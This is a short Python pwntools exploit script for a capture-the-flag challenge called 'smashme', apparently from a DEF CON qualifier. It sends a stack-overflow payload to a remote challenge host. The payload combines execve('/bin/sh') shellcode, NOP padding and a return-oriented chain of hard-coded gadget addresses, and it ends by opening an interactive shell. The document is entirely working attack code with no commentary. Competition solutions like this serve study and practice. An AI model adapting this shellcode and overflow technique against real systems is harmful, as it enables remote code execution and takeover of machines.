from pwn import * 

context.bits = 64

sub_rax = 0x43d193
sub_rax_rdx = 0x412d5d
mov_rax_rsi = 0x451743
jmp_rdi = 0x4c4e1b
jmp_rax = 0x4a2a5f
pop_rdx = 0x441e46

chk = "Smash me outside, how bout dAAAAAAAAAAA"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)
#r = process('./smashme')

print r.recvline()

#payload = '\xeb' + chr(len(chk))+"\x90"*2+chk+shellcode+'\x90'*(68-len(chk)-len(shellcode))+jmp_rdi	

payload = shellcode+chk+"\x90"*(72-len(chk)-len(shellcode))
payload += pack(pop_rdx)
payload += pack(47)
payload += pack(mov_rax_rsi)
payload += pack(sub_rax_rdx)
payload += pack(jmp_rax)

r.sendline(payload)

r.interactive() 
